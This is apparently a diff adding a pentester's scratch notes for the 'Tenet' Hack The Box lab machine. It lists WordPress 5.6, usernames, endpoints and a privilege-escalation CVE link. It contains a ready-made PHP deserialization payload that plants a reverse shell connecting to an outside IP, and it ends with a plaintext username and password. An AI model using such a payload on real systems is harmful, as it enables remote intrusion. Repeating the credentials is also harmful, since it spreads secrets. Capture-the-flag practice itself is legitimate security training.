@@ -1,0 +1,19 @@
+Wordpress 5.6
+
+Potential Users:
+    - neil
+    - protagonist
+
+Weird links:
+    http://tenet.htb/index.php/wp-json/
+    http://tenet.htb/xmlrpc.php?rsd
+
+Search without parameters to grab init Wordpress post
+
+10.10.10.44/wordpress/wp-admin/ <- mistake? dashboard is at tenet.htb/wp-admin
+
+https://www.cvedetails.com/cve/CVE-2019-0211/ <- Privesc
+
+O:14:"DatabaseExport":2:{s:9:"user_file";s:13:"parrotguy.php";s:4:"data";s:119:"<?php $sock=fsockopen("10.10.16.73",8798);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>";}
+
+neil / Opera2112
